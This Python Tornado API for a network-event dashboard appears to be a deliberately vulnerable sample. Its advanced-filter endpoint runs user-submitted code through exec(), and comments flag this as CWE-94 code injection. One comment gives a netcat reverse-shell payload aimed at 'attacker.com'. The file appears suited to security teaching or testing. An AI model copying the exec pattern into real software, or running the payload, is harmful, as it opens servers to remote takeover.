import tornado.ioloop
import tornado.web
import json
import logging
import uuid
from typing import Dict, Any

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger('NetDash')

# In-memory storage for network events
NETWORK_EVENTS = [
    {"id": "ev_1", "source_ip": "192.168.1.10", "dest_ip": "10.0.0.5", "protocol": "TCP", "bytes": 1024, "status": "allowed"},
    {"id": "ev_2", "source_ip": "192.168.1.11", "dest_ip": "10.0.0.5", "protocol": "UDP", "bytes": 64, "status": "dropped"},
    {"id": "ev_3", "source_ip": "10.0.0.2", "dest_ip": "8.8.8.8", "protocol": "DNS", "bytes": 128, "status": "allowed"},
    {"id": "ev_4", "source_ip": "192.168.1.15", "dest_ip": "10.0.0.5", "protocol": "TCP", "bytes": 4096, "status": "allowed"},
]

class BaseHandler(tornado.web.RequestHandler):
    def set_default_headers(self):
        self.set_header("Content-Type", 'application/json')
        self.set_header("Server", "NetDash-API/1.0")

    def write_error(self, status_code, **kwargs):
        self.finish(json.dumps({
            "error": {
                "code": status_code,
                "message": self._reason
            }
        }))

class HealthCheckHandler(BaseHandler):
    def get(self):
        """Simple health check endpoint"""
        self.write(json.dumps({
            "status": "healthy",
            "uptime": tornado.ioloop.IOLoop.current().time()
        }))

class EventListHandler(BaseHandler):
    def get(self):
        """Retrieve all network events"""
        self.write(json.dumps({
            "count": len(NETWORK_EVENTS),
            "events": NETWORK_EVENTS
        }))

class StaticFilterHandler(BaseHandler):
    def post(self):
        """Filter events using predefined static criteria"""
        try:
            body = json.loads(self.request.body)
            protocol = body.get("protocol")
            
            if not protocol:
                self.set_status(400)
                self.write(json.dumps({"error": "Missing protocol"}))
                return
                
            filtered = [ev for ev in NETWORK_EVENTS if ev["protocol"] == protocol]
            self.write(json.dumps({
                "filter_type": "static",
                "match_count": len(filtered),
                "results": filtered
            }))
        except json.JSONDecodeError:
            self.set_status(400)
            self.write(json.dumps({"error": "Invalid JSON body"}))

class AdvancedRuleHandler(BaseHandler):
    def post(self):
        """
        VULNERABLE ENDPOINT: CWE-94 Code Injection
        Allows administrators to submit custom Python code as a filtering rule.
        The system executes this code dynamically to filter the network events.
        """
        try:
            body = json.loads(self.request.body)
            rule_name = body.get("rule_name", f"rule_{uuid.uuid4().hex[:8]}")
            custom_code = body.get("rule_code")

            if not custom_code:
                self.set_status(400)
                self.write(json.dumps({"error": "rule_code is required for advanced filtering"}))
                return

            logger.info(f"Applying advanced rule: {rule_name}")
            
            # The custom code should define a function named 'evaluate_event'
            # Example payload for custom_code:
            # def evaluate_event(event):
            #     return event['bytes'] > 1000 and event['status'] == 'allowed'
            
            # Create a localized namespace for execution to capture the function
            local_namespace: Dict[str, Any] = {}
            
            # VULNERABLE SINK: exec() is used on raw, user-controlled input
            # An attacker can bypass the intended function definition and run OS commands
            # Example malicious payload: 
            # __import__('os').system('nc -e /bin/sh attacker.com 1337')
            exec(custom_code, globals(), local_namespace)
            
            if 'evaluate_event' not in local_namespace:
                self.set_status(400)
                self.write(json.dumps({"error": "Rule code must define an 'evaluate_event' function"}))
                return
                
            evaluate_func = local_namespace['evaluate_event']
            
            # Apply the dynamically generated function
            filtered_events = []
            for event in NETWORK_EVENTS:
                try:
                    if evaluate_func(event):
                        filtered_events.append(event)
                except Exception as eval_err:
                    logger.warning(f"Error evaluating event {event['id']}: {eval_err}")
                    continue

            self.write(json.dumps({
                "rule_name": rule_name,
                "match_count": len(filtered_events),
                "results": filtered_events
            }))

        except json.JSONDecodeError:
            self.set_status(400)
            self.write(json.dumps({"error": "Invalid JSON body format"}))
        except Exception as e:
            logger.error(f"Rule execution failed: {str(e)}")
            self.set_status(500)
            self.write(json.dumps({"error": "Internal server error during rule execution"}))

def make_app():
    return tornado.web.Application([
        (r"/api/v1/health", HealthCheckHandler),
        (r"/api/v1/events", EventListHandler),
        (r"/api/v1/events/filter/static", StaticFilterHandler),
        (r"/api/v1/events/filter/advanced", AdvancedRuleHandler),
    ], debug=False)

if __name__ == "__main__":
    app = make_app()
    port = 8888
    app.listen(port)
    logger.info(f"NetDash API listening on port {port}")
    try:
        tornado.ioloop.IOLoop.current().start()
    except KeyboardInterrupt:
        logger.info("Shutting down NetDash API")
        tornado.ioloop.IOLoop.current().stop()
